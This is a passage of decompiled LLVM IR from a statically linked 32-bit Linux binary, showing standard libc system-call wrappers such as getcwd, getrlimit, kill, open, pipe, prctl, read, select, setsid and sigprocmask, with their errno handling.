  %v1_805046b = icmp eq i32 %arg1, 0
  br i1 %v1_805046b, label %dec_label_pc_805047f, label %dec_label_pc_805046f

dec_label_pc_805046f:                             ; preds = %dec_label_pc_805046b
  %v1_805046f = call i32 @__errno_location(i32 %v0_805045b)
  %v1_8050474 = inttoptr i32 %v1_805046f to i32*
  store i32 22, i32* %v1_8050474, align 4
  br label %dec_label_pc_8050505

dec_label_pc_805047f:                             ; preds = %dec_label_pc_805046b
  %v3_805047f = call i32 @__GI_getpagesize(i32 %v0_805045b, i32 %v0_805045a, i32 %v0_8050459)
  store i32 %v3_805047f, i32* @ebx, align 4
  %v5_805048b = icmp slt i32 %v3_805047f, 4096
  br i1 %v5_805048b, label %dec_label_pc_805048d, label %dec_label_pc_805049c

dec_label_pc_805048d:                             ; preds = %dec_label_pc_805047f
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_805049c

dec_label_pc_8050494:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8050498 = icmp eq i32 %arg1, 0
  %v1_805049a = icmp eq i1 %v1_8050498, false
  br i1 %v1_805049a, label %dec_label_pc_80504ae, label %dec_label_pc_805049c

dec_label_pc_805049c:                             ; preds = %dec_label_pc_805047f, %dec_label_pc_8050494, %dec_label_pc_805048d
  %v0_805049f = phi i32 [ %v3_805047f, %dec_label_pc_805047f ], [ %arg2, %dec_label_pc_8050494 ], [ 4096, %dec_label_pc_805048d ]
  store i32 %v0_805049f, i32* %stack_var_-44, align 4
  %v1_80504a0 = call i32 @malloc(i32 %v0_805049f)
  store i32 %v1_80504a0, i32* @esi, align 4
  %v1_80504aa = icmp eq i32 %v1_80504a0, 0
  br i1 %v1_80504aa, label %dec_label_pc_8050505, label %dec_label_pc_805049c.dec_label_pc_80504ae_crit_edge

dec_label_pc_805049c.dec_label_pc_80504ae_crit_edge: ; preds = %dec_label_pc_805049c
  %v0_80504b9.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_80504ae

dec_label_pc_80504ae:                             ; preds = %dec_label_pc_805049c.dec_label_pc_80504ae_crit_edge, %dec_label_pc_8050494
  %v0_80504b9 = phi i32 [ %v0_80504b9.pre, %dec_label_pc_805049c.dec_label_pc_80504ae_crit_edge ], [ %tmp11, %dec_label_pc_8050494 ]
  %v0_80504ae = phi i32 [ %v1_80504a0, %dec_label_pc_805049c.dec_label_pc_80504ae_crit_edge ], [ %arg1, %dec_label_pc_8050494 ]
  store i32 %v0_80504ae, i32* @ebx, align 4
  %v2_80504b9 = call i32 @getcwd(i32 %v0_80504b9, i32 %tmp12)
  %v0_80504bb = load i32, i32* @ebx, align 4
  store i32 %v0_80504bb, i32* @edx, align 4
  store i32 %v2_80504b9, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_80504b9, -4095
  br i1 %tmp18, label %dec_label_pc_80504d1, label %dec_label_pc_80504c6

dec_label_pc_80504c6:                             ; preds = %dec_label_pc_80504ae
  %v0_80504c6 = load i32, i32* %stack_var_-44, align 4
  %v1_80504c6 = call i32 @__errno_location(i32 %v0_80504c6)
  %v0_80504cb = load i32, i32* @ebx, align 4
  %v1_80504cb = sub i32 0, %v0_80504cb
  store i32 %v1_80504cb, i32* @ebx, align 4
  %v2_80504cd = inttoptr i32 %v1_80504c6 to i32*
  store i32 %v1_80504cb, i32* %v2_80504cd, align 4
  br label %dec_label_pc_80504f3

dec_label_pc_80504d1:                             ; preds = %dec_label_pc_80504ae
  %v2_80504d1 = icmp slt i32 %v2_80504b9, 0
  br i1 %v2_80504d1, label %dec_label_pc_80504f3, label %dec_label_pc_80504d5

dec_label_pc_80504d5:                             ; preds = %dec_label_pc_80504d1
  %v0_80504d5 = load i32, i32* @edi, align 4
  %v1_80504d5 = icmp eq i32 %v0_80504d5, 0
  %v1_80504d7 = icmp eq i1 %v1_80504d5, false
  br i1 %v1_80504d7, label %dec_label_pc_8050507, label %dec_label_pc_80504d9

dec_label_pc_80504d9:                             ; preds = %dec_label_pc_80504d5
  br i1 %v1_8050469, label %dec_label_pc_80504ef, label %dec_label_pc_80504dd

dec_label_pc_80504dd:                             ; preds = %dec_label_pc_80504d9
  %v0_80504e0 = load i32, i32* @esi, align 4
  store i32 %v0_80504e0, i32* %stack_var_-44, align 4
  %v4_80504e1 = inttoptr i32 %v0_80504e0 to i32*
  %v5_80504e1 = call i32 @realloc(i32* %v4_80504e1, i32 %v2_80504b9, i32 %v0_80504bb, i32 %v0_80504bb)
  %v1_80504eb = icmp eq i32 %v5_80504e1, 0
  %v1_80504ed = icmp eq i1 %v1_80504eb, false
  br i1 %v1_80504ed, label %dec_label_pc_8050507, label %dec_label_pc_80504ef

dec_label_pc_80504ef:                             ; preds = %dec_label_pc_80504dd, %dec_label_pc_80504d9
  %v0_80504ef = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050507

dec_label_pc_80504f3:                             ; preds = %dec_label_pc_80504d1, %dec_label_pc_80504c6
  %v0_80504f3 = load i32, i32* @edi, align 4
  %v1_80504f3 = icmp eq i32 %v0_80504f3, 0
  %v1_80504f5 = icmp eq i1 %v1_80504f3, false
  br i1 %v1_80504f5, label %dec_label_pc_8050505, label %dec_label_pc_80504f7

dec_label_pc_80504f7:                             ; preds = %dec_label_pc_80504f3
  %v0_80504fa = load i32, i32* @esi, align 4
  store i32 %v0_80504fa, i32* %stack_var_-44, align 4
  %v1_80504fb = call i32 @free(i32 %v0_80504fa)
  %v0_805050a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050507

dec_label_pc_8050505:                             ; preds = %dec_label_pc_80504f3, %dec_label_pc_805049c, %dec_label_pc_805046f
  br label %dec_label_pc_8050507

dec_label_pc_8050507:                             ; preds = %dec_label_pc_80504dd, %dec_label_pc_80504d5, %dec_label_pc_80504f7, %dec_label_pc_80504ef, %dec_label_pc_8050505
  %v0_805050a = phi i32 [ %v5_80504e1, %dec_label_pc_80504dd ], [ %v0_80504d5, %dec_label_pc_80504d5 ], [ %v0_805050a.pre, %dec_label_pc_80504f7 ], [ %v0_80504ef, %dec_label_pc_80504ef ], [ 0, %dec_label_pc_8050505 ]
  store i32 %v0_805045b, i32* @ebx, align 4
  store i32 %v0_805045a, i32* @esi, align 4
  store i32 %v0_8050459, i32* @edi, align 4
  store i32 %v0_8050458, i32* @ebp, align 4
  ret i32 %v0_805050a

; uselistorder directives
  uselistorder i32 %v2_80504b9, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80504a0, { 0, 2, 1 }
  uselistorder i32 %v0_805049f, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_8050507, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_805049c, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_8050517 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805051e = call i32 @getrlimit(i32 7, i32 %v2_8050517)
  store i32 256, i32* @edx, align 4
  %v2_805052b = icmp slt i32 %v2_805051e, 0
  br i1 %v2_805052b, label %dec_label_pc_8050533, label %dec_label_pc_805052f

dec_label_pc_805052f:                             ; preds = %entry
  %v3_805052f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_805052f, i32* @edx, align 4
  br label %dec_label_pc_8050533

dec_label_pc_8050533:                             ; preds = %entry, %dec_label_pc_805052f
  %v0_8050533 = phi i32 [ 256, %entry ], [ %v3_805052f, %dec_label_pc_805052f ]
  ret i32 %v0_8050533

; uselistorder directives
  uselistorder label %dec_label_pc_8050533, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_805053c = load i32, i32* @global_var_8061790.457, align 16
  %v1_8050546 = icmp eq i32 %v0_805053c, 0
  br i1 %v1_8050546, label %dec_label_pc_805054c, label %dec_label_pc_805054a

dec_label_pc_805054a:                             ; preds = %entry
  br label %dec_label_pc_805054c

dec_label_pc_805054c:                             ; preds = %entry, %dec_label_pc_805054a
  %storemerge = phi i32 [ %v0_805053c, %dec_label_pc_805054a ], [ 4096, %entry ]
  %v0_805054c = phi i32 [ %v0_805053c, %dec_label_pc_805054a ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_805054c

; uselistorder directives
  uselistorder label %dec_label_pc_805054c, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050550 = load i32, i32* @ebx, align 4
  store i32 %v0_8050550, i32* %stack_var_-4, align 4
  %v1_8050559 = call i32 @getpid(i32 %v0_8050550)
  store i32 %v1_8050559, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8050559, -4095
  br i1 %tmp6, label %dec_label_pc_8050570, label %dec_label_pc_8050564

dec_label_pc_8050564:                             ; preds = %entry
  %v0_8050564 = load i32, i32* %stack_var_-4, align 4
  %v1_8050564 = call i32 @__errno_location(i32 %v0_8050564)
  %v0_8050569 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050569 = sub i32 0, %v0_8050569
  %v2_805056b = inttoptr i32 %v1_8050564 to i32*
  store i32 %v1_8050569, i32* %v2_805056b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050570

dec_label_pc_8050570:                             ; preds = %entry, %dec_label_pc_8050564
  %v0_8050570 = phi i32 [ %v1_8050559, %entry ], [ -1, %dec_label_pc_8050564 ]
  %v2_8050574 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050574, i32* @ebx, align 4
  ret i32 %v0_8050570

; uselistorder directives
  uselistorder i32 %v1_8050559, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050570, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050578 = load i32, i32* @ebx, align 4
  store i32 %v0_8050578, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805058b = call i32 @int80_syscall(i32 191)
  store i32 %v1_805058b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_805058b, -4095
  br i1 %tmp8, label %dec_label_pc_80505a4, label %dec_label_pc_8050598

dec_label_pc_8050598:                             ; preds = %entry
  %v0_8050598 = load i32, i32* %stack_var_-4, align 4
  %v1_8050598 = call i32 @__errno_location(i32 %v0_8050598)
  %v0_805059d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805059d = sub i32 0, %v0_805059d
  %v2_805059f = inttoptr i32 %v1_8050598 to i32*
  store i32 %v1_805059d, i32* %v2_805059f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80505a4

dec_label_pc_80505a4:                             ; preds = %entry, %dec_label_pc_8050598
  %v0_80505a4 = phi i32 [ %v1_805058b, %entry ], [ -1, %dec_label_pc_8050598 ]
  %v2_80505a8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80505a8, i32* @ebx, align 4
  ret i32 %v0_80505a4

; uselistorder directives
  uselistorder i32 %v1_805058b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_80505a4, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80505ac = load i32, i32* @edi, align 4
  store i32 %v0_80505ac, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_80505c4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80505cc = call i32 @ioctl(i32 %v0_80505c4, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_80505c4, i32* @ebx, align 4
  store i32 %v3_80505cc, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_80505cc, -4095
  br i1 %tmp11, label %dec_label_pc_80505e4, label %dec_label_pc_80505d8

dec_label_pc_80505d8:                             ; preds = %entry
  %v1_80505d8 = call i32 @__errno_location(i32 %v0_80505c4)
  %v0_80505dd = load i32, i32* %edi.global-to-local, align 4
  %v1_80505dd = sub i32 0, %v0_80505dd
  %v2_80505df = inttoptr i32 %v1_80505d8 to i32*
  store i32 %v1_80505dd, i32* %v2_80505df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80505e4

dec_label_pc_80505e4:                             ; preds = %entry, %dec_label_pc_80505d8
  %v0_80505e4 = phi i32 [ %v3_80505cc, %entry ], [ -1, %dec_label_pc_80505d8 ]
  %v2_80505e9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80505e9, i32* @edi, align 4
  ret i32 %v0_80505e4

; uselistorder directives
  uselistorder i32 %v3_80505cc, { 1, 0, 2 }
  uselistorder i32 %v0_80505c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80505e4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80505ec = load i32, i32* @ebx, align 4
  store i32 %v0_80505ec, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_80505ff = call i32 @kill(i32 %v0_80505ec, i32 %tmp4)
  store i32 %v2_80505ff, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_80505ff, -4095
  br i1 %tmp8, label %dec_label_pc_8050618, label %dec_label_pc_805060c

dec_label_pc_805060c:                             ; preds = %entry
  %v0_805060c = load i32, i32* %stack_var_-4, align 4
  %v1_805060c = call i32 @__errno_location(i32 %v0_805060c)
  %v0_8050611 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050611 = sub i32 0, %v0_8050611
  %v2_8050613 = inttoptr i32 %v1_805060c to i32*
  store i32 %v1_8050611, i32* %v2_8050613, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050618

dec_label_pc_8050618:                             ; preds = %entry, %dec_label_pc_805060c
  %v0_8050618 = phi i32 [ %v2_80505ff, %entry ], [ -1, %dec_label_pc_805060c ]
  %v2_805061a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805061a, i32* @edx, align 4
  %v2_805061c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805061c, i32* @ebx, align 4
  ret i32 %v0_8050618

; uselistorder directives
  uselistorder i32 %v2_80505ff, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050618, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8050621 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8050627 = sdiv i32 %sext, 16777216
  store i32 %v4_8050627, i32* @ecx, align 4
  %v4_805062b = ptrtoint i8* %arg1 to i32
  %v3_805062f = and i32 %arg2, 64
  %v4_805062f = icmp eq i32 %v3_805062f, 0
  br i1 %v4_805062f, label %dec_label_pc_8050640, label %dec_label_pc_8050634

dec_label_pc_8050634:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8050640

dec_label_pc_8050640:                             ; preds = %entry, %dec_label_pc_8050634
  %v0_8050640 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_8050634 ]
  store i32 %v0_8050640, i32* @edx, align 4
  store i32 %v4_805062b, i32* %ebx.global-to-local, align 4
  %v5_805064b = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8050627)
  store i32 %v5_805064b, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_805064b, -4095
  br i1 %tmp15, label %dec_label_pc_8050663, label %dec_label_pc_8050657

dec_label_pc_8050657:                             ; preds = %dec_label_pc_8050640
  %v1_8050657 = call i32 @__errno_location(i32 %v0_8050621)
  %v0_805065c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805065c = sub i32 0, %v0_805065c
  %v2_805065e = inttoptr i32 %v1_8050657 to i32*
  store i32 %v1_805065c, i32* %v2_805065e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050663

dec_label_pc_8050663:                             ; preds = %dec_label_pc_8050640, %dec_label_pc_8050657
  %v0_8050663 = phi i32 [ %v5_805064b, %dec_label_pc_8050640 ], [ -1, %dec_label_pc_8050657 ]
  store i32 %v0_8050621, i32* @ebx, align 4
  ret i32 %v0_8050663

; uselistorder directives
  uselistorder i32 %v5_805064b, { 1, 0, 2 }
  uselistorder i32 %v4_8050627, { 1, 0 }
  uselistorder i32 %v0_8050621, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050663, { 1, 0 }
  uselistorder label %dec_label_pc_8050640, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_805067b = inttoptr i32 %arg1 to i8*
  %v4_805067b = call i32 @__libc_open(i8* %v3_805067b, i32 577)
  ret i32 %v4_805067b
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050684 = load i32, i32* @edi, align 4
  store i32 %v0_8050684, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805068c = load i32, i32* @ebx, align 4
  %v1_8050694 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050694 = call i32 @pipe([2 x i32] %v1_8050694)
  store i32 %v0_805068c, i32* @ebx, align 4
  store i32 %v2_8050694, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8050694, -4095
  br i1 %tmp8, label %dec_label_pc_80506ac, label %dec_label_pc_80506a0

dec_label_pc_80506a0:                             ; preds = %entry
  %v1_80506a0 = call i32 @__errno_location(i32 %v0_805068c)
  %v0_80506a5 = load i32, i32* %edi.global-to-local, align 4
  %v1_80506a5 = sub i32 0, %v0_80506a5
  %v2_80506a7 = inttoptr i32 %v1_80506a0 to i32*
  store i32 %v1_80506a5, i32* %v2_80506a7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80506ac

dec_label_pc_80506ac:                             ; preds = %entry, %dec_label_pc_80506a0
  %v0_80506ac = phi i32 [ %v2_8050694, %entry ], [ -1, %dec_label_pc_80506a0 ]
  %v2_80506b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80506b0, i32* @edi, align 4
  ret i32 %v0_80506ac

; uselistorder directives
  uselistorder i32 %v2_8050694, { 1, 0, 2 }
  uselistorder i32 %v0_805068c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80506ac, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80506b4 = load i32, i32* @edi, align 4
  %v0_80506b5 = load i32, i32* @esi, align 4
  store i32 %v0_80506b5, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_80506cd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_80506d5 = call i32 @prctl(i32 %v0_80506cd, i32 %v0_80506b5, i32 %v0_80506b4, i32 %tmp6, i32 %arg1)
  store i32 %v0_80506cd, i32* @ebx, align 4
  store i32 %v5_80506d5, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_80506d5, -4095
  br i1 %tmp11, label %dec_label_pc_80506ed, label %dec_label_pc_80506e1

dec_label_pc_80506e1:                             ; preds = %entry
  %v1_80506e1 = call i32 @__errno_location(i32 %v0_80506cd)
  %v0_80506e6 = load i32, i32* %esi.global-to-local, align 4
  %v1_80506e6 = sub i32 0, %v0_80506e6
  %v2_80506e8 = inttoptr i32 %v1_80506e1 to i32*
  store i32 %v1_80506e6, i32* %v2_80506e8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80506ed

dec_label_pc_80506ed:                             ; preds = %entry, %dec_label_pc_80506e1
  %v0_80506ed = phi i32 [ %v5_80506d5, %entry ], [ -1, %dec_label_pc_80506e1 ]
  %v2_80506f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80506f0, i32* @esi, align 4
  store i32 %v0_80506b4, i32* @edi, align 4
  ret i32 %v0_80506ed

; uselistorder directives
  uselistorder i32 %v5_80506d5, { 1, 0, 2 }
  uselistorder i32 %v0_80506cd, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80506ed, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80506f4 = load i32, i32* @edi, align 4
  store i32 %v0_80506f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050704 = load i32, i32* @ebx, align 4
  %v4_805070c = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050704, i32* @ebx, align 4
  store i32 %v4_805070c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_805070c, -4095
  br i1 %tmp11, label %dec_label_pc_8050724, label %dec_label_pc_8050718

dec_label_pc_8050718:                             ; preds = %entry
  %v1_8050718 = call i32 @__errno_location(i32 %v0_8050704)
  %v0_805071d = load i32, i32* %edi.global-to-local, align 4
  %v1_805071d = sub i32 0, %v0_805071d
  %v2_805071f = inttoptr i32 %v1_8050718 to i32*
  store i32 %v1_805071d, i32* %v2_805071f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050724

dec_label_pc_8050724:                             ; preds = %entry, %dec_label_pc_8050718
  %v0_8050724 = phi i32 [ %v4_805070c, %entry ], [ -1, %dec_label_pc_8050718 ]
  %v2_8050728 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050728, i32* @edi, align 4
  ret i32 %v0_8050724

; uselistorder directives
  uselistorder i32 %v4_805070c, { 1, 0, 2 }
  uselistorder i32 %v0_8050704, { 1, 0 }
  uselistorder label %dec_label_pc_8050724, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805072d = load i32, i32* @esi, align 4
  store i32 %v0_805072d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8050745 = load i32, i32* @ebx, align 4
  %v1_805074d = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050745, i32* @ebx, align 4
  store i32 %v1_805074d, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_805074d, -4095
  br i1 %tmp11, label %dec_label_pc_8050765, label %dec_label_pc_8050759

dec_label_pc_8050759:                             ; preds = %entry
  %v1_8050759 = call i32 @__errno_location(i32 %v0_8050745)
  %v0_805075e = load i32, i32* %esi.global-to-local, align 4
  %v1_805075e = sub i32 0, %v0_805075e
  %v2_8050760 = inttoptr i32 %v1_8050759 to i32*
  store i32 %v1_805075e, i32* %v2_8050760, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050765

dec_label_pc_8050765:                             ; preds = %entry, %dec_label_pc_8050759
  %v0_8050765 = phi i32 [ %v1_805074d, %entry ], [ -1, %dec_label_pc_8050759 ]
  %v2_8050767 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050767, i32* @edx, align 4
  %v2_8050768 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050768, i32* @esi, align 4
  ret i32 %v0_8050765

; uselistorder directives
  uselistorder i32 %v1_805074d, { 1, 0, 2 }
  uselistorder i32 %v0_8050745, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8050765, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805076c = load i32, i32* @ebx, align 4
  store i32 %v0_805076c, i32* %stack_var_-4, align 4
  %v1_8050775 = call i32 @setsid(i32 %v0_805076c)
  store i32 %v1_8050775, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8050775, -4095
  br i1 %tmp6, label %dec_label_pc_805078c, label %dec_label_pc_8050780

dec_label_pc_8050780:                             ; preds = %entry
  %v0_8050780 = load i32, i32* %stack_var_-4, align 4
  %v1_8050780 = call i32 @__errno_location(i32 %v0_8050780)
  %v0_8050785 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050785 = sub i32 0, %v0_8050785
  %v2_8050787 = inttoptr i32 %v1_8050780 to i32*
  store i32 %v1_8050785, i32* %v2_8050787, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805078c

dec_label_pc_805078c:                             ; preds = %entry, %dec_label_pc_8050780
  %v0_805078c = phi i32 [ %v1_8050775, %entry ], [ -1, %dec_label_pc_8050780 ]
  %v2_8050790 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050790, i32* @ebx, align 4
  ret i32 %v0_805078c

; uselistorder directives
  uselistorder i32 %v1_8050775, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805078c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8050795 = load i32, i32* @esi, align 4
  %v4_8050799 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8050799, i32* @ecx, align 4
  %v2_80507a5 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_80507a5, label %dec_label_pc_80507be, label %dec_label_pc_80507a9

dec_label_pc_80507a9:                             ; preds = %entry
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_80507be, label %dec_label_pc_80507ae

dec_label_pc_80507ae:                             ; preds = %dec_label_pc_80507a9
  %v1_80507ae = call i32 @__errno_location(i32 %v0_8050795)
  %v1_80507b3 = inttoptr i32 %v1_80507ae to i32*
  store i32 22, i32* %v1_80507b3, align 4
  br label %dec_label_pc_80507e5

dec_label_pc_80507be:                             ; preds = %dec_label_pc_80507a9, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_80507c3 = load i32, i32* @ebx, align 4
  %v7_80507cb = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp4)
  store i32 %v0_80507c3, i32* @ebx, align 4
  store i32 %v7_80507cb, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_80507cb, -4095
  br i1 %tmp13, label %dec_label_pc_80507e5, label %dec_label_pc_80507d7

dec_label_pc_80507d7:                             ; preds = %dec_label_pc_80507be
  %v1_80507d7 = call i32 @__errno_location(i32 %v0_80507c3)
  %v0_80507dc = load i32, i32* %esi.global-to-local, align 4
  %v1_80507dc = sub i32 0, %v0_80507dc
  %v2_80507de = inttoptr i32 %v1_80507d7 to i32*
  store i32 %v1_80507dc, i32* %v2_80507de, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80507e5

dec_label_pc_80507e5:                             ; preds = %dec_label_pc_80507d7, %dec_label_pc_80507be, %dec_label_pc_80507ae
  %storemerge = phi i32 [ -1, %dec_label_pc_80507ae ], [ %v7_80507cb, %dec_label_pc_80507be ], [ -1, %dec_label_pc_80507d7 ]
  %v2_80507e5 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80507e5, i32* @edx, align 4
  store i32 %v0_8050795, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_80507cb, { 1, 0, 2 }
  uselistorder i32 %v0_80507c3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
